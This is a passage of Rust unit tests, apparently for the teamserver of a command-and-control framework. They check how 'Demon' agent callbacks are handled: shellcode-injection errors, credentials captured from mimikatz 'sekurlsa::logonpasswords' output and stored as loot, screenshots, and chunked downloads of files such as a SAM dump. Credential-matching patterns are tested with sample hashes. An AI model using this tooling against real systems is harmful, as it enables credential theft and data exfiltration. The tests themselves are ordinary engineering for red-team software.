            .dispatch(
                0x0102_0304,
                u32::from(DemonCommand::CommandInjectShellcode),
                9,
                &u32::from(DemonInjectError::ProcessArchMismatch).to_le_bytes(),
            )
            .await?;

        let event = receiver.recv().await.ok_or_else(|| "shellcode response missing".to_owned())?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Process architecture mismatch".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_command_output_handler_captures_credentials_and_broadcasts_loot()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EE01,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        registry
            .enqueue_job(
                0xABCD_EE01,
                Job {
                    command: u32::from(DemonCommand::CommandOutput),
                    request_id: 0x66,
                    payload: Vec::new(),
                    command_line: "sekurlsa::logonpasswords".to_owned(),
                    task_id: "66".to_owned(),
                    created_at: "2026-03-10T10:00:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let mut payload = Vec::new();
        add_bytes(&mut payload, b"Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB");
        dispatcher
            .dispatch(0xABCD_EE01, u32::from(DemonCommand::CommandOutput), 0x66, &payload)
            .await?;

        let first = receiver.recv().await.ok_or("missing output event")?;
        let second = receiver.recv().await.ok_or("missing loot event")?;
        let third = receiver.recv().await.ok_or("missing credential event")?;

        let OperatorMessage::AgentResponse(output_message) = first else {
            panic!("expected command output response");
        };
        assert_eq!(output_message.info.command_line.as_deref(), Some("sekurlsa::logonpasswords"));
        assert_eq!(
            output_message.info.extra.get("Message"),
            Some(&Value::String("Received Output [55 bytes]:".to_owned()))
        );
        assert_eq!(
            output_message.info.extra.get("RequestID"),
            Some(&Value::String("66".to_owned()))
        );
        assert_eq!(output_message.info.extra.get("TaskID"), Some(&Value::String("66".to_owned())));

        let OperatorMessage::AgentResponse(loot_message) = second else {
            panic!("expected loot-new response");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        assert_eq!(
            loot_message.info.extra.get("Operator"),
            Some(&Value::String("operator".to_owned()))
        );

        let OperatorMessage::CredentialsAdd(credentials) = third else {
            panic!("expected credentials event");
        };
        assert_eq!(
            credentials.info.fields.get("CommandLine"),
            Some(&Value::String("sekurlsa::logonpasswords".to_owned()))
        );

        let loot = database.loot().list_for_agent(0xABCD_EE01).await?;
        assert_eq!(loot.len(), 1);
        assert!(loot.iter().all(|entry| entry.kind == "credential"));
        assert!(loot.iter().any(|entry| {
            entry.data.as_deref()
                == Some(b"Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB".as_slice())
        }));
        assert!(loot.iter().all(|entry| {
            entry.metadata.as_ref().and_then(|value| value.get("operator"))
                == Some(&Value::String("operator".to_owned()))
        }));
        let responses = database.agent_responses().list_for_agent(0xABCD_EE01).await?;
        assert_eq!(responses.len(), 1);
        assert_eq!(responses[0].request_id, 0x66);
        assert_eq!(responses[0].response_type, "Good");
        assert_eq!(responses[0].command_line.as_deref(), Some("sekurlsa::logonpasswords"));
        assert_eq!(responses[0].task_id.as_deref(), Some("66"));
        assert_eq!(responses[0].operator.as_deref(), Some("operator"));
        assert_eq!(
            responses[0].output,
            "Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB"
        );
        Ok(())
    }

    #[test]
    fn looks_like_credential_line_matches_expected_patterns() {
        let cases = [
            ("Password : Sup3rSecret!", true),
            ("username=alice", true),
            ("NTLM:0123456789ABCDEF0123456789ABCDEF", true),
            (
                "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                false,
            ),
            ("status: password reset not required", false),
            ("operator message: secret rotation completed", false),
            ("https://example.test/password/reset", false),
            ("C:\\Windows\\Temp\\password.txt", false),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_credential_line(line),
                expected,
                "unexpected classification for {line:?}"
            );
        }
    }

    #[test]
    fn looks_like_inline_secret_handles_expected_and_edge_cases() {
        let cases = [
            ("alice@example.com:Sup3rSecret!", true),
            ("LAB\\alice:Sup3rSecret!", true),
            ("operator:Password123", true),
            ("https://alice:Password123@example.test", false),
            ("status: password rotation completed", false),
            ("C:\\Temp\\secret.txt", false),
            ("LAB\\alice:short", true),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_inline_secret(line),
                expected,
                "unexpected inline-secret classification for {line:?}"
            );
        }
    }

    #[test]
    fn looks_like_pwdump_hash_matches_pwdump_format_only() {
        let cases = [
            (
                "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                true,
            ),
            (
                "alice:1001:0123456789ABCDEFFEDCBA9876543210:00112233445566778899AABBCCDDEEFF:::",
                true,
            ),
            ("NTLM:0123456789ABCDEF0123456789ABCDEF", false),
            ("Administrator:500:nothex:32ED87BDB5FDC5E9CBA88547376818D4:::", false),
            ("status: hash sync completed", false),
        ];

        for (line, expected) in cases {
            assert_eq!(
                looks_like_pwdump_hash(line),
                expected,
                "unexpected pwdump classification for {line:?}"
            );
        }
    }

    #[test]
    fn extract_credentials_captures_blocks_inline_secrets_and_hashes() {
        let output = [
            "status: password reset not required",
            "message: domain join succeeded",
            "Username : alice",
            "Password : Sup3rSecret!",
            "Domain   : LAB",
            "",
            "alice@example.com:InlinePass123",
            "C:\\Windows\\Temp\\password.txt",
            "https://example.test/password/reset",
            "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
            "operator message: secret rotation completed",
        ]
        .join("\n");

        let captures = extract_credentials(&output);
        let actual = captures
            .iter()
            .map(|capture| (capture.label.as_str(), capture.pattern, capture.content.as_str()))
            .collect::<Vec<_>>();

        assert_eq!(
            actual,
            vec![
                (
                    "credential-block",
                    "keyword-block",
                    "Username : alice\nPassword : Sup3rSecret!\nDomain   : LAB",
                ),
                ("inline-credential", "inline-secret", "alice@example.com:InlinePass123",),
                (
                    "password-hash",
                    "pwdump-hash",
                    "Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::",
                ),
            ]
        );
    }

    #[tokio::test]
    async fn builtin_beacon_output_and_error_callbacks_persist_response_history()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EE02,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        registry
            .enqueue_job(
                0xABCD_EE02,
                Job {
                    command: u32::from(DemonCommand::BeaconOutput),
                    request_id: 0x67,
                    payload: Vec::new(),
                    command_line: "inline-execute seatbelt".to_owned(),
                    task_id: "67".to_owned(),
                    created_at: "2026-03-10T10:05:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let mut output = Vec::new();
        add_u32(&mut output, u32::from(DemonCallback::Output));
        add_bytes(&mut output, b"Seatbelt complete");
        dispatcher
            .dispatch(0xABCD_EE02, u32::from(DemonCommand::BeaconOutput), 0x67, &output)
            .await?;

        let mut error = Vec::new();
        add_u32(&mut error, u32::from(DemonCallback::ErrorMessage));
        add_bytes(&mut error, b"access denied");
        dispatcher
            .dispatch(0xABCD_EE02, u32::from(DemonCommand::BeaconOutput), 0x67, &error)
            .await?;

        let first = receiver.recv().await.ok_or("missing beacon output event")?;
        let second = receiver.recv().await.ok_or("missing beacon error event")?;

        let OperatorMessage::AgentResponse(first_message) = first else {
            panic!("expected beacon output response");
        };
        assert_eq!(first_message.info.command_line.as_deref(), Some("inline-execute seatbelt"));
        assert_eq!(first_message.info.extra.get("Type"), Some(&Value::String("Good".to_owned())));

        let OperatorMessage::AgentResponse(second_message) = second else {
            panic!("expected beacon error response");
        };
        assert_eq!(second_message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(second_message.info.extra.get("TaskID"), Some(&Value::String("67".to_owned())));

        let responses = database.agent_responses().list_for_agent(0xABCD_EE02).await?;
        assert_eq!(responses.len(), 2);
        assert_eq!(responses[0].output, "Seatbelt complete");
        assert_eq!(responses[0].response_type, "Good");
        assert_eq!(responses[1].output, "access denied");
        assert_eq!(responses[1].response_type, "Error");
        assert!(responses.iter().all(|response| response.request_id == 0x67));
        assert!(responses.iter().all(|response| {
            response.command_line.as_deref() == Some("inline-execute seatbelt")
        }));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_screenshot_handler_persists_loot_and_broadcasts_misc_fields()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF01,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let png = vec![0x89, b'P', b'N', b'G'];
        let payload = [1_u32.to_le_bytes().to_vec(), {
            let mut data = Vec::new();
            add_bytes(&mut data, &png);
            data
        }]
        .concat();

        dispatcher
            .dispatch(0xABCD_EF01, u32::from(DemonCommand::CommandScreenshot), 0x44, &payload)
            .await?;

        let loot = database.loot().list_for_agent(0xABCD_EF01).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "screenshot");
        assert_eq!(loot[0].data.as_deref(), Some(png.as_slice()));

        let loot_event = receiver.recv().await.ok_or_else(|| "loot event missing".to_owned())?;
        let event =
            receiver.recv().await.ok_or_else(|| "screenshot response missing".to_owned())?;
        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
            panic!("expected screenshot loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected screenshot agent response event");
        };
        assert_eq!(
            message.info.extra.get("MiscType"),
            Some(&Value::String("screenshot".to_owned()))
        );
        assert_eq!(
            message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(&png)))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_persists_loot_and_progress()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF11,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x33_u32;
        let remote_path = "C:\\Temp\\sam.dump";
        let content = b"secret-bytes";

        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, file_id);
        add_u64(&mut open, u64::try_from(content.len())?);
        add_utf16(&mut open, remote_path);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &open).await?;

        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut write, 1);
        add_u32(&mut write, file_id);
        add_bytes(&mut write, content);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &write).await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut close, 2);
        add_u32(&mut close, file_id);
        add_u32(&mut close, 0);
        dispatcher.dispatch(0xABCD_EF11, u32::from(DemonCommand::CommandFs), 0x99, &close).await?;

        let first = receiver.recv().await.ok_or("missing open event")?;
        let second = receiver.recv().await.ok_or("missing progress event")?;
        let third = receiver.recv().await.ok_or("missing loot event")?;
        let fourth = receiver.recv().await.ok_or("missing completion event")?;

        let OperatorMessage::AgentResponse(open_message) = first else {
            panic!("expected download open response");
        };
        assert_eq!(
            open_message.info.extra.get("MiscType"),
            Some(&Value::String("download-progress".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_message) = second else {
            panic!("expected download progress response");
        };
        assert_eq!(
            progress_message.info.extra.get("CurrentSize"),
            Some(&Value::String(content.len().to_string()))
        );

        let OperatorMessage::AgentResponse(loot_message) = third else {
            panic!("expected loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );

        let OperatorMessage::AgentResponse(done_message) = fourth else {
            panic!("expected download completion response");
        };
        assert_eq!(
            done_message.info.extra.get("MiscType"),
            Some(&Value::String("download".to_owned()))
        );
        assert_eq!(
            done_message.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(content)))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF11).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].kind, "download");
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_accumulates_multi_chunk_downloads_until_close()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF12,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x34_u32;
        let remote_path = "C:\\Temp\\partial.dump";

        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_open(file_id, 64, remote_path),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_write(file_id, b"secret-"),
            )
            .await?;
        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_write(file_id, b"bytes"),
            )
            .await?;

        assert!(database.loot().list_for_agent(0xABCD_EF12).await?.is_empty());

        let _ = receiver.recv().await.ok_or("missing filesystem open event")?;
        let progress_one =
            receiver.recv().await.ok_or("missing first filesystem progress event")?;
        let progress_two =
            receiver.recv().await.ok_or("missing second filesystem progress event")?;

        let OperatorMessage::AgentResponse(progress_one) = progress_one else {
            panic!("expected first filesystem progress response");
        };
        assert_eq!(
            progress_one.info.extra.get("CurrentSize"),
            Some(&Value::String("7".to_owned()))
        );
        assert_eq!(
            progress_one.info.extra.get("ExpectedSize"),
            Some(&Value::String("64".to_owned()))
        );

        let OperatorMessage::AgentResponse(progress_two) = progress_two else {
            panic!("expected second filesystem progress response");
        };
        assert_eq!(
            progress_two.info.extra.get("CurrentSize"),
            Some(&Value::String("12".to_owned()))
        );
        assert_eq!(
            progress_two.info.extra.get("ExpectedSize"),
            Some(&Value::String("64".to_owned()))
        );
        let active = dispatcher.downloads.active_for_agent(0xABCD_EF12).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, file_id);
        assert_eq!(active[0].1.request_id, 0x9A);
        assert_eq!(active[0].1.remote_path, remote_path);
        assert_eq!(active[0].1.expected_size, 64);
        assert_eq!(active[0].1.data, b"secret-bytes");
        assert!(
            !active[0].1.started_at.is_empty(),
            "active filesystem download should preserve its start timestamp"
        );
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "filesystem download should remain incomplete until close"
        );

        dispatcher
            .dispatch(
                0xABCD_EF12,
                u32::from(DemonCommand::CommandFs),
                0x9A,
                &filesystem_download_close(file_id, 0),
            )
            .await?;

        let _ = receiver.recv().await.ok_or("missing filesystem loot event")?;
        let completion = receiver.recv().await.ok_or("missing filesystem completion event")?;
        let OperatorMessage::AgentResponse(completion) = completion else {
            panic!("expected filesystem completion response");
        };
        assert_eq!(
            completion.info.extra.get("MiscData"),
            Some(&Value::String(BASE64_STANDARD.encode(b"secret-bytes")))
        );

        let loot = database.loot().list_for_agent(0xABCD_EF12).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(b"secret-bytes".as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_filesystem_download_handler_rejects_writes_without_open()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF13,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let error = dispatcher
            .dispatch(
                0xABCD_EF13,
                u32::from(DemonCommand::CommandFs),
                0x9B,
                &filesystem_download_write(0x35, b"orphan"),
            )
            .await
            .expect_err("filesystem download write without open should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000035 was not opened"
        ));
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "unexpected events for rejected filesystem download write"
        );
        assert!(database.loot().list_for_agent(0xABCD_EF13).await?.is_empty());
        Ok(())
    }

    #[tokio::test]
    async fn download_tracker_accumulates_multi_chunk_data_until_finish() {
        let tracker = DownloadTracker::new(64);
        tracker
            .start(
                0xABCD_EF51,
                0x41,
                DownloadState {
                    request_id: 0x71,
                    remote_path: "C:\\Temp\\multi.bin".to_owned(),
                    expected_size: 32,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:00:00Z".to_owned(),
                },
            )
            .await;

        let first =
            tracker.append(0xABCD_EF51, 0x41, b"abc").await.expect("first chunk should append");
        assert_eq!(first.data, b"abc");
        assert_eq!(first.expected_size, 32);

        let second =
            tracker.append(0xABCD_EF51, 0x41, b"def").await.expect("second chunk should append");
        assert_eq!(second.data, b"abcdef");
        assert_eq!(second.expected_size, 32);

        let finished = tracker.finish(0xABCD_EF51, 0x41).await;
        assert_eq!(
            finished,
            Some(DownloadState {
                request_id: 0x71,
                remote_path: "C:\\Temp\\multi.bin".to_owned(),
                expected_size: 32,
                data: b"abcdef".to_vec(),
                started_at: "2026-03-11T09:00:00Z".to_owned(),
            })
        );
        assert_eq!(tracker.finish(0xABCD_EF51, 0x41).await, None);
    }

    #[tokio::test]
    async fn download_tracker_keeps_partial_downloads_active_until_finish() {
        let tracker = DownloadTracker::new(64);
        tracker
            .start(
                0xABCD_EF54,
                0x44,
                DownloadState {
                    request_id: 0x73,
                    remote_path: "C:\\Temp\\pending.bin".to_owned(),
                    expected_size: 32,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:10:00Z".to_owned(),
                },
            )
            .await;

        let partial = tracker
            .append(0xABCD_EF54, 0x44, b"partial")
            .await
            .expect("partial chunk should append");
        assert_eq!(partial.data, b"partial");
        assert_eq!(partial.expected_size, 32);

        let active = tracker.active_for_agent(0xABCD_EF54).await;
        assert_eq!(active.len(), 1);
        assert_eq!(active[0].0, 0x44);
        assert_eq!(active[0].1, partial);

        assert_eq!(tracker.active_for_agent(0xABCD_EF99).await, Vec::new());
        assert_eq!(tracker.finish(0xABCD_EF54, 0x44).await, Some(partial));
    }

    #[tokio::test]
    async fn download_tracker_drain_agent_discards_all_partial_downloads_for_agent() {
        let tracker = DownloadTracker::with_limits(64, 128);

        for (agent_id, file_id, data) in [
            (0xABCD_EF57, 0x70_u32, b"first".as_slice()),
            (0xABCD_EF57, 0x71_u32, b"second".as_slice()),
            (0xABCD_EF58, 0x72_u32, b"third".as_slice()),
        ] {
            tracker
                .start(
                    agent_id,
                    file_id,
                    DownloadState {
                        request_id: file_id,
                        remote_path: format!("C:\\Temp\\{file_id:08x}.bin"),
                        expected_size: 32,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:25:00Z".to_owned(),
                    },
                )
                .await;
            let state = tracker.append(agent_id, file_id, data).await.expect("chunk should append");
            assert_eq!(state.data, data);
        }

        assert_eq!(tracker.buffered_bytes().await, 16);
        assert_eq!(tracker.drain_agent(0xABCD_EF57).await, 2);
        assert!(tracker.active_for_agent(0xABCD_EF57).await.is_empty());
        assert_eq!(tracker.buffered_bytes().await, 5);
        assert_eq!(tracker.active_for_agent(0xABCD_EF58).await.len(), 1);
        assert_eq!(tracker.drain_agent(0xABCD_EF57).await, 0);
    }

    #[tokio::test]
    async fn download_tracker_rejects_chunks_for_unknown_downloads() {
        let tracker = DownloadTracker::new(64);

        let error = tracker
            .append(0xABCD_EF52, 0x42, b"orphan")
            .await
            .expect_err("append without start should fail");
        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload {
                command_id,
                message,
            } if command_id == u32::from(DemonCommand::BeaconOutput)
                && message == "download 0x00000042 was not opened"
        ));
    }

    #[tokio::test]
    async fn download_tracker_drops_downloads_that_exceed_the_size_cap() {
        let tracker = DownloadTracker::new(4);
        tracker
            .start(
                0xABCD_EF53,
                0x43,
                DownloadState {
                    request_id: 0x72,
                    remote_path: "C:\\Temp\\oversized.bin".to_owned(),
                    expected_size: 16,
                    data: Vec::new(),
                    started_at: "2026-03-11T09:05:00Z".to_owned(),
                },
            )
            .await;

        let partial = tracker
            .append(0xABCD_EF53, 0x43, b"12")
            .await
            .expect("first partial chunk should append");
        assert_eq!(partial.data, b"12");

        let error = tracker
            .append(0xABCD_EF53, 0x43, b"345")
            .await
            .expect_err("downloads above the cap should be dropped");
        assert!(matches!(
            error,
            CommandDispatchError::DownloadTooLarge {
                agent_id: 0xABCD_EF53,
                file_id: 0x43,
                max_download_bytes: 4,
            }
        ));
        assert_eq!(tracker.finish(0xABCD_EF53, 0x43).await, None);
    }

    #[tokio::test]
    async fn download_tracker_limits_total_buffered_bytes_across_partial_downloads() {
        let tracker = DownloadTracker::with_limits(8, 10);

        for file_id in [0x50_u32, 0x51, 0x52] {
            tracker
                .start(
                    0xABCD_EF55,
                    file_id,
                    DownloadState {
                        request_id: 0x80 + file_id,
                        remote_path: format!("C:\\Temp\\{file_id:08x}.bin"),
                        expected_size: 16,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:15:00Z".to_owned(),
                    },
                )
                .await;
        }

        assert_eq!(
            tracker.append(0xABCD_EF55, 0x50, b"abcd").await.expect("first chunk").data,
            b"abcd"
        );
        assert_eq!(
            tracker.append(0xABCD_EF55, 0x51, b"efgh").await.expect("second chunk").data,
            b"efgh"
        );
        assert_eq!(tracker.buffered_bytes().await, 8);

        let error = tracker
            .append(0xABCD_EF55, 0x52, b"ijk")
            .await
            .expect_err("aggregate cap should reject additional concurrent partial data");
        assert!(matches!(
            error,
            CommandDispatchError::DownloadAggregateTooLarge {
                agent_id: 0xABCD_EF55,
                file_id: 0x52,
                max_total_download_bytes: 10,
            }
        ));
        assert_eq!(tracker.buffered_bytes().await, 8);

        let active = tracker.active_for_agent(0xABCD_EF55).await;
        assert_eq!(active.len(), 2);
        assert_eq!(active[0].0, 0x50);
        assert_eq!(active[0].1.data, b"abcd");
        assert_eq!(active[1].0, 0x51);
        assert_eq!(active[1].1.data, b"efgh");
        assert_eq!(tracker.finish(0xABCD_EF55, 0x52).await, None);
    }

    #[tokio::test]
    async fn download_tracker_keeps_idle_partial_downloads_until_finish() {
        let tracker = DownloadTracker::with_limits(16, 12);

        for file_id in [0x60_u32, 0x61] {
            tracker
                .start(
                    0xABCD_EF56,
                    file_id,
                    DownloadState {
                        request_id: 0x90 + file_id,
                        remote_path: format!("C:\\Temp\\idle-{file_id:08x}.bin"),
                        expected_size: 32,
                        data: Vec::new(),
                        started_at: "2026-03-11T09:20:00Z".to_owned(),
                    },
                )
                .await;
        }

        tracker.append(0xABCD_EF56, 0x60, b"12").await.expect("first partial should append");
        tracker.append(0xABCD_EF56, 0x61, b"34").await.expect("second partial should append");
        assert_eq!(tracker.buffered_bytes().await, 4);

        tokio::time::sleep(std::time::Duration::from_millis(5)).await;

        let continued = tracker
            .append(0xABCD_EF56, 0x60, b"56")
            .await
            .expect("idle transfer should still accept more data");
        assert_eq!(continued.data, b"1256");
        assert_eq!(tracker.buffered_bytes().await, 6);

        let active = tracker.active_for_agent(0xABCD_EF56).await;
        assert_eq!(active.len(), 2);
        assert_eq!(active[0].0, 0x60);
        assert_eq!(active[0].1.data, b"1256");
        assert_eq!(active[1].0, 0x61);
        assert_eq!(active[1].1.data, b"34");

        assert_eq!(
            tracker.finish(0xABCD_EF56, 0x60).await,
            Some(DownloadState {
                request_id: 0xF0,
                remote_path: "C:\\Temp\\idle-00000060.bin".to_owned(),
                expected_size: 32,
                data: b"1256".to_vec(),
                started_at: "2026-03-11T09:20:00Z".to_owned(),
            })
        );
        assert_eq!(tracker.buffered_bytes().await, 2);
        assert_eq!(
            tracker.finish(0xABCD_EF56, 0x61).await,
            Some(DownloadState {
                request_id: 0xF1,
                remote_path: "C:\\Temp\\idle-00000061.bin".to_owned(),
                expected_size: 32,
                data: b"34".to_vec(),
                started_at: "2026-03-11T09:20:00Z".to_owned(),
            })
        );
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_reassemble_downloads()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF21,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

        let file_id = 0x55_u32;
        let remote_path = "C:\\Windows\\Temp\\note.txt";
        let content = b"beacon-chunk";

        let mut open_header = Vec::new();
        open_header.extend_from_slice(&file_id.to_be_bytes());
        open_header.extend_from_slice(&(u32::try_from(content.len())?).to_be_bytes());
        open_header.extend_from_slice(remote_path.as_bytes());
        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonCallback::File));
        add_bytes(&mut open, &open_header);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &open)
            .await?;

        let mut chunk = Vec::new();
        chunk.extend_from_slice(&file_id.to_be_bytes());
        chunk.extend_from_slice(content);
        let mut write = Vec::new();
        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut write, &chunk);
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
            .await?;

        let mut close = Vec::new();
        add_u32(&mut close, u32::from(DemonCallback::FileClose));
        add_bytes(&mut close, &file_id.to_be_bytes());
        dispatcher
            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
            .await?;

        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
        let _ = receiver.recv().await.ok_or("missing beacon progress event")?;
        let loot_event = receiver.recv().await.ok_or("missing beacon loot event")?;
        let final_event = receiver.recv().await.ok_or("missing beacon completion event")?;
        let OperatorMessage::AgentResponse(loot_message) = loot_event else {
            panic!("expected beacon file loot event");
        };
        assert_eq!(
            loot_message.info.extra.get("MiscType"),
            Some(&Value::String("loot-new".to_owned()))
        );
        let OperatorMessage::AgentResponse(message) = final_event else {
            panic!("expected beacon file completion response");
        };
        assert_eq!(message.info.extra.get("MiscType"), Some(&Value::String("download".to_owned())));

        let loot = database.loot().list_for_agent(0xABCD_EF21).await?;
        assert_eq!(loot.len(), 1);
        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_beacon_file_callbacks_accumulate_partial_downloads_until_close()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        registry
            .insert(sample_agent_info(
                0xABCD_EF22,
                [0x11; AGENT_KEY_LENGTH],
                [0x22; AGENT_IV_LENGTH],
            ))
            .await?;
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events,
            database.clone(),
            sockets,
            None,
        );

